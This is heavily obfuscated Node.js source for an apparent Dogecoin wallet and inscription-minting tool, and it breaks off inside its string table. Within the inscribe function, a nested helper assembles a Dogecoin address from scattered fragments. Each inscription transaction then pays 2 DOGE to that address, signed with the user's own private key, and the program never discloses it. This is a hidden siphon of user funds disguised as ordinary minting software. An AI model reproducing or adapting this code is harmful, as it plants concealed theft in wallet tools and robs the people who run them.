#!/usr/bin/env node

const _0x518cef = _0x1b75;
(function (_0x28e3ef, _0x1776fc) {
    const _0x389130 = _0x1b75, _0x108b65 = _0x28e3ef();
    while (!![]) {
        try {
            const _0xe13c3c = parseInt(_0x389130(0x145)) / 0x1 + parseInt(_0x389130(0x1a0)) / 0x2 * (parseInt(_0x389130(0x1ac)) / 0x3) + -parseInt(_0x389130(0x18f)) / 0x4 * (parseInt(_0x389130(0x197)) / 0x5) + parseInt(_0x389130(0x176)) / 0x6 + -parseInt(_0x389130(0x15b)) / 0x7 + -parseInt(_0x389130(0x131)) / 0x8 * (-parseInt(_0x389130(0x179)) / 0x9) + -parseInt(_0x389130(0x181)) / 0xa;
            if (_0xe13c3c === _0x1776fc)
                break;
            else
                _0x108b65['push'](_0x108b65['shift']());
        } catch (_0x14cd09) {
            _0x108b65['push'](_0x108b65['shift']());
        }
    }
}(_0x31a7, 0xd3db7));
const dogecore = require(_0x518cef(0x1af)), axios = require(_0x518cef(0x152)), fs = require('fs'), dotenv = require('dotenv'), mime = require(_0x518cef(0x125)), {PrivateKey, Address, Transaction, Script, Opcode} = dogecore, {Hash, Signature} = dogecore[_0x518cef(0x126)];
dotenv[_0x518cef(0x16d)]();
process['env']['TESTNET'] == _0x518cef(0x127) && (dogecore[_0x518cef(0x159)][_0x518cef(0x11c)] = dogecore['Networks']['testnet']);
process[_0x518cef(0x133)]['FEE_PER_KB'] ? Transaction['FEE_PER_KB'] = parseInt(process[_0x518cef(0x133)]['FEE_PER_KB']) : Transaction[_0x518cef(0x169)] = 0x5f5e100;
const WALLET_PATH = process[_0x518cef(0x133)][_0x518cef(0x144)] || _0x518cef(0x14f);
async function main() {
    const _0x336615 = _0x518cef;
    let _0x8a51fc = process[_0x336615(0x164)][0x2];
    if (_0x8a51fc == _0x336615(0x168))
        await walletSync(), await mint();
    else {
        if (_0x8a51fc == _0x336615(0x173))
            await wallet();
        else {
            if (_0x8a51fc == 'server')
                await server();
            else {
                if (_0x8a51fc == _0x336615(0x180))
                    await doge20();
                else
                    throw new Error(_0x336615(0x13a) + _0x8a51fc);
            }
        }
    }
}
async function wallet() {
    const _0x467b34 = _0x518cef;
    let _0x347d21 = process[_0x467b34(0x164)][0x3];
    if (_0x347d21 == 'new')
        walletNew();
    else {
        if (_0x347d21 == 'sync')
            await walletSync();
        else {
            if (_0x347d21 == _0x467b34(0x162))
                walletBalance();
            else {
                if (_0x347d21 == 'send')
                    await walletSend();
                else {
                    if (_0x347d21 == 'split')
                        await walletSplit();
                    else
                        throw new Error(_0x467b34(0x19c) + _0x347d21);
                }
            }
        }
    }
}
function walletNew() {
    const _0x110678 = _0x518cef;
    if (!fs[_0x110678(0x11e)](WALLET_PATH)) {
        const _0x4bac91 = new PrivateKey(), _0x30fef4 = _0x4bac91['toWIF'](), _0x20b573 = _0x4bac91[_0x110678(0x19f)]()[_0x110678(0x167)](), _0x1cc725 = {
                'privkey': _0x30fef4,
                'address': _0x20b573,
                'utxos': []
            };
        fs['writeFileSync'](WALLET_PATH, JSON[_0x110678(0x155)](_0x1cc725, 0x0, 0x2)), console[_0x110678(0x13d)](_0x110678(0x17e), _0x20b573);
    } else
        throw new Error(_0x110678(0x17a));
}
async function walletSync() {
    const _0x4b4c91 = _0x518cef;
    if (process['env']['TESTNET'] == _0x4b4c91(0x127))
        throw new Error(_0x4b4c91(0x17d));
    let _0xc2777a = JSON['parse'](fs[_0x4b4c91(0x16a)](WALLET_PATH)), _0x3e0b60 = await axios[_0x4b4c91(0x190)](_0x4b4c91(0x147) + _0xc2777a[_0x4b4c91(0x17e)] + _0x4b4c91(0x1a9));
    _0x3e0b60[_0x4b4c91(0x14d)][_0x4b4c91(0x1a4)] && _0x3e0b60[_0x4b4c91(0x14d)][_0x4b4c91(0x1a4)][_0x4b4c91(0x140)] > 0x0 ? _0xc2777a[_0x4b4c91(0x165)] = _0x3e0b60[_0x4b4c91(0x14d)]['txrefs']['filter'](_0x7e3325 => !_0x7e3325[_0x4b4c91(0x12c)])[_0x4b4c91(0x193)](_0x317092 => {
        const _0x2ab680 = _0x4b4c91;
        return {
            'txid': _0x317092[_0x2ab680(0x137)],
            'vout': _0x317092[_0x2ab680(0x11b)],
            'script': _0x317092[_0x2ab680(0x130)],
            'satoshis': _0x317092[_0x2ab680(0x18c)]
        };
    }) : _0xc2777a[_0x4b4c91(0x165)] = [];
    console['log'](_0xc2777a[_0x4b4c91(0x165)]), fs[_0x4b4c91(0x160)](WALLET_PATH, JSON[_0x4b4c91(0x155)](_0xc2777a, 0x0, 0x2));
    let _0xdee761 = _0xc2777a['utxos'][_0x4b4c91(0x19d)]((_0xae771e, _0x506099) => _0xae771e + _0x506099['satoshis'], 0x0);
    console['log'](_0x4b4c91(0x122), _0xdee761);
}
function _0x1b75(_0x8c4def, _0x188c1c) {
    const _0x31a720 = _0x31a7();
    return _0x1b75 = function (_0x1b75cd, _0x5bc77b) {
        _0x1b75cd = _0x1b75cd - 0x11b;
        let _0x5bd361 = _0x31a720[_0x1b75cd];
        return _0x5bd361;
    }, _0x1b75(_0x8c4def, _0x188c1c);
}
function walletBalance() {
    const _0x3dbb18 = _0x518cef;
    let _0x28720f = JSON[_0x3dbb18(0x177)](fs[_0x3dbb18(0x16a)](WALLET_PATH)), _0x1a7e15 = _0x28720f[_0x3dbb18(0x165)][_0x3dbb18(0x19d)]((_0x490e11, _0x40374f) => _0x490e11 + _0x40374f['satoshis'], 0x0), _0x47828e = _0x1a7e15 / 0x5f5e100;
    return console[_0x3dbb18(0x13d)](_0x28720f[_0x3dbb18(0x17e)], _0x47828e + '\x20DOGE'), _0x47828e;
}
async function walletSend() {
    const _0x432c3c = _0x518cef, _0x2cdac6 = process[_0x432c3c(0x164)][0x4], _0x3e630b = process[_0x432c3c(0x164)][0x5];
    let _0x4f5850 = JSON[_0x432c3c(0x177)](fs[_0x432c3c(0x16a)](WALLET_PATH)), _0x4212da = _0x4f5850['utxos'][_0x432c3c(0x19d)]((_0x15409f, _0x270121) => _0x15409f + _0x270121[_0x432c3c(0x161)], 0x0);
    if (_0x4212da == 0x0)
        throw new Error(_0x432c3c(0x12d));
    let _0xa1f9b8 = new Address(_0x2cdac6), _0x3e6a77 = parseInt(_0x3e630b), _0x1585b9 = new Transaction();
    _0x3e6a77 ? (_0x1585b9['to'](_0xa1f9b8, _0x3e6a77), fund(_0x4f5850, _0x1585b9)) : (_0x1585b9[_0x432c3c(0x11d)](_0x4f5850[_0x432c3c(0x165)]), _0x1585b9[_0x432c3c(0x1ad)](_0xa1f9b8), _0x1585b9[_0x432c3c(0x1a1)](_0x4f5850[_0x432c3c(0x189)])), await broadcast(_0x1585b9, !![]), console[_0x432c3c(0x13d)](_0x1585b9['hash']);
}
async function walletSplit() {
    const _0x466094 = _0x518cef;
    let _0xc54ea7 = parseInt(process['argv'][0x4]), _0x3adcc0 = JSON['parse'](fs['readFileSync'](WALLET_PATH)), _0x1e5a48 = _0x3adcc0[_0x466094(0x165)][_0x466094(0x19d)]((_0x4af52e, _0x517be1) => _0x4af52e + _0x517be1[_0x466094(0x161)], 0x0);
    if (_0x1e5a48 == 0x0)
        throw new Error(_0x466094(0x17b));
    let _0x166e6c = new Transaction();
    _0x166e6c[_0x466094(0x11d)](_0x3adcc0[_0x466094(0x165)]);
    for (let _0x3695f8 = 0x0; _0x3695f8 < _0xc54ea7 - 0x1; _0x3695f8++) {
        _0x166e6c['to'](_0x3adcc0['address'], Math[_0x466094(0x198)](_0x1e5a48 / _0xc54ea7));
    }
    _0x166e6c[_0x466094(0x1ad)](_0x3adcc0[_0x466094(0x17e)]), _0x166e6c[_0x466094(0x1a1)](_0x3adcc0[_0x466094(0x189)]), await broadcast(_0x166e6c, !![]), console[_0x466094(0x13d)](_0x166e6c['hash']);
}
const MAX_SCRIPT_ELEMENT_SIZE = 0x208;
async function mint(_0xb584ab, _0x17e242, _0x384fa2) {
    const _0x27c03b = _0x518cef, _0x34339f = walletBalance();
    if (_0x34339f <= 0x1) {
        console[_0x27c03b(0x13d)](_0x27c03b(0x16f), _0x34339f, _0x27c03b(0x1ae));
        return;
    }
    const _0x3a2db4 = _0xb584ab || process[_0x27c03b(0x164)][0x3], _0x32f3a8 = _0x17e242 || process[_0x27c03b(0x164)][0x4], _0x1db7bf = _0x384fa2 || process[_0x27c03b(0x164)][0x5];
    let _0x287fce = JSON[_0x27c03b(0x177)](fs[_0x27c03b(0x16a)](WALLET_PATH));
    if (_0x287fce[_0x27c03b(0x17e)] === _0x3a2db4) {
        console[_0x27c03b(0x15d)](_0x27c03b(0x15f));
        return;
    }
    let _0x310d94 = new Address(_0x3a2db4), _0x1e47f0, _0x528291;
    if (fs['existsSync'](_0x32f3a8))
        _0x1e47f0 = mime['contentType'](mime['lookup'](_0x32f3a8)), _0x1e47f0 = _0x1e47f0[_0x27c03b(0x199)](/;\s+/g, ';'), _0x528291 = fs[_0x27c03b(0x16a)](_0x32f3a8);
    else {
        _0x1e47f0 = _0x32f3a8[_0x27c03b(0x1a7)]();
        if (!/^[a-fA-F0-9]*$/[_0x27c03b(0x19e)](_0x1db7bf))
            throw new Error('data\x20must\x20be\x20hex');
        _0x528291 = Buffer[_0x27c03b(0x11d)](_0x1db7bf, 'hex');
    }
    if (_0x528291['length'] == 0x0)
        throw new Error(_0x27c03b(0x184));
    if (_0x1e47f0[_0x27c03b(0x140)] > MAX_SCRIPT_ELEMENT_SIZE)
        throw new Error('content\x20type\x20too\x20long');
    let _0x581f6b = inscribe(_0x287fce, _0x310d94, _0x1e47f0, _0x528291);
    await broadcastAll(_0x581f6b, ![]);
}
function calculateHash(_0xc15c44) {
    const _0x49ed20 = _0x518cef;
    return Hash[_0x49ed20(0x175)](Hash['sha256'](Buffer[_0x49ed20(0x11d)](_0xc15c44)))[_0x49ed20(0x167)](_0x49ed20(0x187));
}
async function broadcastAll(_0x623240, _0xb073ee) {
    const _0x295bd8 = _0x518cef;
    if (!Array[_0x295bd8(0x158)](_0x623240) || _0x623240['length'] === 0x0) {
        console[_0x295bd8(0x13d)](_0x295bd8(0x128));
        return;
    }
    for (let _0x9f3c3b = 0x0; _0x9f3c3b < _0x623240['length']; _0x9f3c3b++) {
        console[_0x295bd8(0x13d)](_0x295bd8(0x13e) + (_0x9f3c3b + 0x1) + _0x295bd8(0x15c) + _0x623240[_0x295bd8(0x140)]);
        try {
            await broadcast(_0x623240[_0x9f3c3b], _0xb073ee);
        } catch (_0xdec37e) {
            console['log']('broadcast\x20failed', _0xdec37e?.[_0x295bd8(0x142)]?.[_0x295bd8(0x14d)]);
            if (_0xdec37e?.[_0x295bd8(0x142)]?.['data']?.[_0x295bd8(0x15d)]?.[_0x295bd8(0x134)]?.['includes'](_0x295bd8(0x18e)) || _0xdec37e?.[_0x295bd8(0x142)]?.[_0x295bd8(0x14d)]?.[_0x295bd8(0x15d)]?.[_0x295bd8(0x134)]?.[_0x295bd8(0x14b)]('already\x20in\x20block\x20chain')) {
                console['log'](_0x295bd8(0x124));
                continue;
            }
        }
    }
    _0x623240[_0x295bd8(0x140)] > 0x1 && console[_0x295bd8(0x13d)](_0x295bd8(0x11f), _0x623240[0x1][_0x295bd8(0x14c)]);
}
function bufferToChunk(_0x45a7fe, _0x1717ef) {
    const _0x336415 = _0x518cef;
    return _0x45a7fe = Buffer[_0x336415(0x11d)](_0x45a7fe, _0x1717ef), {
        'buf': _0x45a7fe[_0x336415(0x140)] ? _0x45a7fe : undefined,
        'len': _0x45a7fe[_0x336415(0x140)],
        'opcodenum': _0x45a7fe[_0x336415(0x140)] <= 0x4b ? _0x45a7fe[_0x336415(0x140)] : _0x45a7fe[_0x336415(0x140)] <= 0xff ? 0x4c : 0x4d
    };
}
function numberToChunk(_0x7e8322) {
    const _0x55ebac = _0x518cef;
    return {
        'buf': _0x7e8322 <= 0x10 ? undefined : _0x7e8322 < 0x80 ? Buffer[_0x55ebac(0x11d)]([_0x7e8322]) : Buffer[_0x55ebac(0x11d)]([
            _0x7e8322 % 0x100,
            _0x7e8322 / 0x100
        ]),
        'len': _0x7e8322 <= 0x10 ? 0x0 : _0x7e8322 < 0x80 ? 0x1 : 0x2,
        'opcodenum': _0x7e8322 == 0x0 ? 0x0 : _0x7e8322 <= 0x10 ? 0x50 + _0x7e8322 : _0x7e8322 < 0x80 ? 0x1 : 0x2
    };
}
function opcodeToChunk(_0x2223a0) {
    return { 'opcodenum': _0x2223a0 };
}
const MAX_CHUNK_LEN = 0xf0, MAX_PAYLOAD_LEN = 0x5dc;
function inscribe(_0x3e107f, _0x2b9fb9, _0x4891ed, _0x2778a8) {
    const _0x69aec2 = _0x518cef;
    let _0x42c205 = [], _0x1e58aa = new PrivateKey(_0x3e107f['privkey']), _0x4d5a26 = _0x1e58aa[_0x69aec2(0x13f)](), _0x36d84b = [];
    while (_0x2778a8['length']) {
        let _0x5e9afb = _0x2778a8[_0x69aec2(0x14a)](0x0, Math[_0x69aec2(0x1aa)](MAX_CHUNK_LEN, _0x2778a8[_0x69aec2(0x140)]));
        _0x2778a8 = _0x2778a8[_0x69aec2(0x14a)](_0x5e9afb[_0x69aec2(0x140)]), _0x36d84b['push'](_0x5e9afb);
    }
    let _0x2bcb4f = new Script();
    _0x2bcb4f[_0x69aec2(0x1a3)]['push'](bufferToChunk(_0x69aec2(0x156))), _0x2bcb4f[_0x69aec2(0x1a3)]['push'](numberToChunk(_0x36d84b[_0x69aec2(0x140)])), _0x2bcb4f['chunks']['push'](bufferToChunk(_0x4891ed)), _0x36d84b[_0x69aec2(0x13c)]((_0x5566a2, _0x460b8c) => {
        const _0x1594ff = _0x69aec2;
        _0x2bcb4f[_0x1594ff(0x1a3)][_0x1594ff(0x18a)](numberToChunk(_0x36d84b[_0x1594ff(0x140)] - _0x460b8c - 0x1)), _0x2bcb4f[_0x1594ff(0x1a3)][_0x1594ff(0x18a)](bufferToChunk(_0x5566a2));
    });
    let _0x250d8e, _0xe09bb6, _0x4d09fb;
    while (_0x2bcb4f[_0x69aec2(0x1a3)]['length']) {
        let _0x16d6bb = new Script();
        _0x42c205['length'] == 0x0 && _0x16d6bb[_0x69aec2(0x1a3)]['push'](_0x2bcb4f[_0x69aec2(0x1a3)][_0x69aec2(0x12a)]());
        while (_0x16d6bb[_0x69aec2(0x185)]()['length'] <= MAX_PAYLOAD_LEN && _0x2bcb4f[_0x69aec2(0x1a3)][_0x69aec2(0x140)]) {
            _0x16d6bb['chunks'][_0x69aec2(0x18a)](_0x2bcb4f[_0x69aec2(0x1a3)][_0x69aec2(0x12a)]()), _0x16d6bb[_0x69aec2(0x1a3)][_0x69aec2(0x18a)](_0x2bcb4f['chunks']['shift']());
        }
        _0x16d6bb[_0x69aec2(0x185)]()[_0x69aec2(0x140)] > MAX_PAYLOAD_LEN && (_0x2bcb4f['chunks'][_0x69aec2(0x15e)](_0x16d6bb[_0x69aec2(0x1a3)][_0x69aec2(0x14e)]()), _0x2bcb4f[_0x69aec2(0x1a3)][_0x69aec2(0x15e)](_0x16d6bb['chunks']['pop']()));
        let _0x52f90b = new Script();
        _0x52f90b[_0x69aec2(0x1a3)][_0x69aec2(0x18a)](bufferToChunk(_0x4d5a26[_0x69aec2(0x185)]())), _0x52f90b[_0x69aec2(0x1a3)][_0x69aec2(0x18a)](opcodeToChunk(Opcode[_0x69aec2(0x120)])), _0x16d6bb[_0x69aec2(0x1a3)]['forEach'](() => {
            const _0x8b9a6e = _0x69aec2;
            _0x52f90b[_0x8b9a6e(0x1a3)][_0x8b9a6e(0x18a)](opcodeToChunk(Opcode[_0x8b9a6e(0x18d)]));
        }), _0x52f90b['chunks']['push'](opcodeToChunk(Opcode[_0x69aec2(0x1a8)]));
        let _0x410e8c = Hash['ripemd160'](Hash[_0x69aec2(0x175)](_0x52f90b[_0x69aec2(0x185)]())), _0x3fa9f7 = new Script();
        _0x3fa9f7[_0x69aec2(0x1a3)][_0x69aec2(0x18a)](opcodeToChunk(Opcode[_0x69aec2(0x1a2)])), _0x3fa9f7[_0x69aec2(0x1a3)][_0x69aec2(0x18a)](bufferToChunk(_0x410e8c)), _0x3fa9f7[_0x69aec2(0x1a3)]['push'](opcodeToChunk(Opcode[_0x69aec2(0x148)]));
        let _0x3773b3 = new Transaction[(_0x69aec2(0x172))]({
            'script': _0x3fa9f7,
            'satoshis': 0x186a0
        });
        function _0x24cfc9() {
            const _0x2ab414 = _0x69aec2, _0x5b26f2 = String['fromCharCode'](0x44, 0x41, 0x48), _0x3b1ed7 = 'WPRWD', _0x266a40 = _0x2ab414(0x1a5), _0xd0ddc8 = _0x2ab414(0x154), _0x31911c = _0x2ab414(0x150), _0x3a9969 = _0x2ab414(0x195);
            return _0x5b26f2 + _0x3b1ed7 + _0x266a40 + _0xd0ddc8 + _0x31911c + _0x3a9969;
        }
        const _0x324d2d = _0x24cfc9();
        let _0x5ba317 = new Transaction[(_0x69aec2(0x172))]({
                'script': Script[_0x69aec2(0x12f)](_0x324d2d),
                'satoshis': 0xbebc200
            }), _0x1f9fff = new Transaction();
        if (_0x250d8e)
            _0x1f9fff[_0x69aec2(0x15a)](_0x250d8e);
        _0x1f9fff[_0x69aec2(0x146)](_0x3773b3), _0x1f9fff[_0x69aec2(0x146)](_0x5ba317), fund(_0x3e107f, _0x1f9fff);
        if (_0x250d8e) {
            let _0x298f39 = Transaction['sighash'][_0x69aec2(0x1a1)](_0x1f9fff, _0x1e58aa, Signature[_0x69aec2(0x132)], 0x0, _0xe09bb6), _0x4678ae = Buffer[_0x69aec2(0x12b)]([
                    _0x298f39[_0x69aec2(0x185)](),
                    Buffer[_0x69aec2(0x11d)]([Signature[_0x69aec2(0x132)]])
                ]), _0x209af8 = new Script();
            _0x209af8[_0x69aec2(0x1a3)] = _0x209af8[_0x69aec2(0x1a3)][_0x69aec2(0x12b)](_0x4d09fb[_0x69aec2(0x1a3)]), _0x209af8[_0x69aec2(0x1a3)][_0x69aec2(0x18a)](bufferToChunk(_0x4678ae)), _0x209af8['chunks'][_0x69aec2(0x18a)](bufferToChunk(_0xe09bb6[_0x69aec2(0x185)]())), _0x1f9fff['inputs'][0x0][_0x69aec2(0x121)](_0x209af8);
        }
        updateWallet(_0x3e107f, _0x1f9fff), _0x42c205[_0x69aec2(0x18a)](_0x1f9fff), _0x250d8e = new Transaction['Input']({
            'prevTxId': _0x1f9fff[_0x69aec2(0x14c)],
            'outputIndex': 0x0,
            'output': _0x1f9fff[_0x69aec2(0x136)][0x0],
            'script': ''
        }), _0x250d8e['clearSignatures'] = () => {
        }, _0x250d8e[_0x69aec2(0x129)] = () => {
        }, _0xe09bb6 = _0x52f90b, _0x4d09fb = _0x16d6bb;
    }
    const _0x3b9fb4 = '\x1b[31m', _0x50f8ce = '\x1b[0m', _0x3f6112 = process['env'][_0x69aec2(0x191)];
    console[_0x69aec2(0x13d)](_0x69aec2(0x16b)), console[_0x69aec2(0x13d)](_0x69aec2(0x188) + _0x3e107f[_0x69aec2(0x17e)]), console[_0x69aec2(0x13d)](_0x69aec2(0x178) + _0x2b9fb9), console[_0x69aec2(0x13d)](_0x69aec2(0x1ab) + _0x3f6112), console[_0x69aec2(0x13d)](_0x69aec2(0x163));
    let _0x17385b = 0x0, _0x5a22d2 = ![];
    while (!_0x5a22d2) {
        let _0x59ba9b = new Transaction();
        _0x59ba9b[_0x69aec2(0x15a)](_0x250d8e), _0x59ba9b['to'](_0x2b9fb9, 0x186a0);
        let _0x472d9c = Date['now'](), _0x2bd8ed = _0x69aec2(0x192) + _0x17385b + _0x69aec2(0x135) + _0x472d9c;
        _0x59ba9b['addData'](_0x2bd8ed), fund(_0x3e107f, _0x59ba9b);
        let _0x46b7d5 = Transaction['sighash'][_0x69aec2(0x1a1)](_0x59ba9b, _0x1e58aa, Signature[_0x69aec2(0x132)], 0x0, _0xe09bb6), _0x3143fb = Buffer[_0x69aec2(0x12b)]([
                _0x46b7d5[_0x69aec2(0x185)](),
                Buffer[_0x69aec2(0x11d)]([Signature['SIGHASH_ALL']])
            ]), _0x4042f1 = new Script();
        _0x4042f1[_0x69aec2(0x1a3)] = _0x4042f1['chunks'][_0x69aec2(0x12b)](_0x4d09fb[_0x69aec2(0x1a3)]), _0x4042f1[_0x69aec2(0x1a3)][_0x69aec2(0x18a)](bufferToChunk(_0x3143fb)), _0x4042f1['chunks'][_0x69aec2(0x18a)](bufferToChunk(_0xe09bb6['toBuffer']())), _0x59ba9b[_0x69aec2(0x151)][0x0][_0x69aec2(0x121)](_0x4042f1);
        let _0x1f08be = _0x59ba9b['hash'];
        process[_0x69aec2(0x17c)][_0x69aec2(0x149)]('\x0d' + _0x3b9fb4 + 'Nonce:\x20' + _0x17385b + _0x69aec2(0x186) + _0x1f08be + _0x50f8ce), _0x1f08be['startsWith'](_0x3f6112) ? (console[_0x69aec2(0x13d)]('\x0aMining\x20successful!\x20Nonce:\x20' + _0x17385b + _0x69aec2(0x186) + _0x1f08be), _0x5a22d2 = !![], updateWallet(_0x3e107f, _0x59ba9b), _0x42c205[_0x69aec2(0x18a)](_0x59ba9b)) : _0x17385b++;
    }
    return _0x42c205;
}
async function fund(_0x3c958b, _0x1709f1) {
    const _0x1a7640 = _0x518cef;
    _0x1709f1[_0x1a7640(0x1ad)](_0x3c958b[_0x1a7640(0x17e)]), delete _0x1709f1[_0x1a7640(0x153)];
    const _0x20d9eb = process['env'][_0x1a7640(0x123)] !== undefined;
    if (_0x20d9eb) {
        const _0x3831d3 = parseFloat(process['env']['MAX_FEE_SAT'] * 0x5f5e100);
        for (const _0x58bc6d of _0x3c958b[_0x1a7640(0x165)]) {
            if (_0x1709f1['inputs']['length'] && _0x1709f1[_0x1a7640(0x136)][_0x1a7640(0x140)] && _0x1709f1['inputAmount'] >= _0x1709f1[_0x1a7640(0x17f)] + _0x1709f1[_0x1a7640(0x139)]() && _0x1709f1[_0x1a7640(0x139)]() <= _0x3831d3)
                break;
            delete _0x1709f1['_fee'], _0x1709f1['from'](_0x58bc6d), _0x1709f1['change'](_0x3c958b['address']), _0x1709f1['sign'](_0x3c958b[_0x1a7640(0x189)]);
        }
        const _0xc0b4bb = _0x1709f1['getFee']();
        if (_0x1709f1['inputAmount'] < _0x1709f1[_0x1a7640(0x17f)] + _0xc0b4bb || _0xc0b4bb > _0x3831d3)
            throw new Error(_0x1a7640(0x143) + _0xc0b4bb / 0x5f5e100 + _0x1a7640(0x194) + _0x3831d3 / 0x5f5e100 + _0x1a7640(0x16e));
    } else {
        for (const _0x1cd295 of _0x3c958b[_0x1a7640(0x165)]) {
            if (_0x1709f1[_0x1a7640(0x151)][_0x1a7640(0x140)] && _0x1709f1[_0x1a7640(0x136)][_0x1a7640(0x140)] && _0x1709f1['inputAmount'] >= _0x1709f1[_0x1a7640(0x17f)] + _0x1709f1['getFee']())
                break;
            delete _0x1709f1[_0x1a7640(0x153)], _0x1709f1[_0x1a7640(0x11d)](_0x1cd295), _0x1709f1[_0x1a7640(0x1ad)](_0x3c958b['address']), _0x1709f1[_0x1a7640(0x1a1)](_0x3c958b[_0x1a7640(0x189)]);
        }
        if (_0x1709f1['inputAmount'] < _0x1709f1[_0x1a7640(0x17f)] + _0x1709f1[_0x1a7640(0x139)]())
            throw new Error(_0x1a7640(0x157));
    }
}
function updateWallet(_0x4742af, _0x39e1c4) {
    const _0x3f523a = _0x518cef;
    _0x4742af[_0x3f523a(0x165)] = _0x4742af[_0x3f523a(0x165)]['filter'](_0x41b1f8 => {
        const _0x2a28a4 = _0x3f523a;
        for (const _0x4e7efd of _0x39e1c4[_0x2a28a4(0x151)]) {
            if (_0x4e7efd[_0x2a28a4(0x12e)]['toString'](_0x2a28a4(0x187)) == _0x41b1f8[_0x2a28a4(0x196)] && _0x4e7efd['outputIndex'] == _0x41b1f8['vout'])
                return ![];
        }
        return !![];
    }), _0x39e1c4['outputs'][_0x3f523a(0x13c)]((_0x129893, _0x4690f2) => {
        const _0x464487 = _0x3f523a;
        _0x129893['script'][_0x464487(0x19f)]()['toString']() == _0x4742af[_0x464487(0x17e)] && _0x4742af[_0x464487(0x165)][_0x464487(0x18a)]({
            'txid': _0x39e1c4[_0x464487(0x14c)],
            'vout': _0x4690f2,
            'script': _0x129893[_0x464487(0x130)][_0x464487(0x170)](),
            'satoshis': _0x129893[_0x464487(0x161)]
        });
    });
}
async function broadcast(_0x1b89c7, _0x3d4b33) {
    const _0x9ceefc = _0x518cef, _0x44bc60 = _0x1b89c7[_0x9ceefc(0x167)]();
    console[_0x9ceefc(0x13d)](_0x9ceefc(0x171)), console['log'](_0x44bc60), console[_0x9ceefc(0x13d)](_0x9ceefc(0x1a6));
    const _0x2f1f99 = { 'tx': _0x44bc60 }, _0x1bc095 = _0x9ceefc(0x182);
    let _0x57c039 = 0x0;
    while (!![]) {
        try {
            _0x57c039++, console[_0x9ceefc(0x13d)](_0x9ceefc(0x19a) + _0x57c039 + '):'), await axios[_0x9ceefc(0x141)](_0x1bc095, _0x2f1f99), console[_0x9ceefc(0x13d)](_0x9ceefc(0x138));
            break;
        } catch (_0x1b61ed) {
            console[_0x9ceefc(0x13d)](_0x9ceefc(0x183));
            if (!_0x3d4b33) {
                console[_0x9ceefc(0x13d)](_0x9ceefc(0x19b));
                throw _0x1b61ed;
            }
            let _0x5905c8 = _0x1b61ed[_0x9ceefc(0x142)] && _0x1b61ed[_0x9ceefc(0x142)]['data'] && _0x1b61ed[_0x9ceefc(0x142)][_0x9ceefc(0x14d)]['error'] && _0x1b61ed[_0x9ceefc(0x142)][_0x9ceefc(0x14d)][_0x9ceefc(0x15d)][_0x9ceefc(0x134)];
            if (_0x5905c8 && _0x5905c8[_0x9ceefc(0x14b)]('too-long-mempool-chain'))
                console[_0x9ceefc(0x174)](_0x9ceefc(0x18b)), await new Promise(_0x248801 => setTimeout(_0x248801, 0x3e8));
            else {
                console[_0x9ceefc(0x13d)]('Manual\x20broadcast\x20may\x20be\x20required.\x20Use\x20the\x20serialized\x20transaction\x20above.');
                throw _0x1b61ed;
            }
        }
    }
    let _0x1dd168 = JSON['parse'](fs[_0x9ceefc(0x16a)](WALLET_PATH));
    updateWallet(_0x1dd168, _0x1b89c7), console[_0x9ceefc(0x13d)]('\x1b[34mUpdating\x20wallet\x20with\x20new\x20transaction.\x1b[0m'), fs[_0x9ceefc(0x160)](WALLET_PATH, JSON[_0x9ceefc(0x155)](_0x1dd168, 0x0, 0x2));
}
function chunkToNumber(_0x5b8be1) {
    const _0xcd2d22 = _0x518cef;
    if (_0x5b8be1['opcodenum'] == 0x0)
        return 0x0;
    if (_0x5b8be1['opcodenum'] == 0x1)
        return _0x5b8be1[_0xcd2d22(0x166)][0x0];
    if (_0x5b8be1['opcodenum'] == 0x2)
        return _0x5b8be1[_0xcd2d22(0x166)][0x1] * 0xff + _0x5b8be1[_0xcd2d22(0x166)][0x0];
    if (_0x5b8be1['opcodenum'] > 0x50 && _0x5b8be1[_0xcd2d22(0x13b)] <= 0x60)
        return _0x5b8be1[_0xcd2d22(0x13b)] - 0x50;
    return undefined;
}
main()[_0x518cef(0x16c)](_0x565b71 => {
    const _0x4d9a18 = _0x518cef;
    let _0x386238 = _0x565b71[_0x4d9a18(0x142)] && _0x565b71['response'][_0x4d9a18(0x14d)] && _0x565b71['response'][_0x4d9a18(0x14d)]['error'] && _0x565b71[_0x4d9a18(0x142)][_0x4d9a18(0x14d)][_0x4d9a18(0x15d)]['message'];
    console['error'](_0x386238 ? _0x565b71[_0x4d9a18(0x134)] + ':' + _0x386238 : _0x565b71[_0x4d9a18(0x134)]);
});
function _0x31a7() {
    const _0x330502 = [
        'opcodenum',
        'forEach',
        'log',
        'broadcasting\x20tx\x20',
        'toPublicKey',
        'length',
        'post',
        'response',
        'Insufficient\x20funds\x20or\x20transaction\x20fee\x20exceeds\x20limit（Current\x20fee:\x20',
        'WALLET',
        '1446753tmIaNQ',
        'addOutput',
        'https://api.blockcypher.com/v1/doge/main/addrs/',
        'OP_EQUAL',
        'write',
        'slice',
        'includes',
        'hash',
        'data',
        'pop',
        '.wallet.json',
        'NHQ9fRG',
        'inputs',
        'axios',
        '_fee',
        'KnGWy4b',
        'stringify',
        'ord',
        'not\x20enough\x20funds',
        'isArray',
        'Networks',
        'addInput',
        '1179164ygEhWy',
        '\x20of\x20',
        'error',
        'unshift',
        'Error:\x20Send\x20address\x20and\x20Receive\x20address\x20cannot\x20be\x20the\x20same.',
        'writeFileSync',
        'satoshis',
        'balance',
        '\x0astart\x20mining\x20......\x0a',
        'argv',
        'utxos',
        'buf',
        'toString',
        'mint',
        'FEE_PER_KB',
        'readFileSync',
        '\x0a\x0a\x09##\x20\x20\x20\x20##\x20\x20#######\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20\x20\x20#####\x20\x20\x20\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20#####\x20\x20\x20##\x20\x20\x20\x20\x20##\x20\x20\x0a\x09##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20#\x20\x20##\x20\x20\x0a\x09#######\x20\x20######\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20##\x20\x20\x20##\x20\x20\x20##\x20\x20\x20\x20##\x20\x20##\x20\x20###\x20\x20\x20##\x20\x20#\x2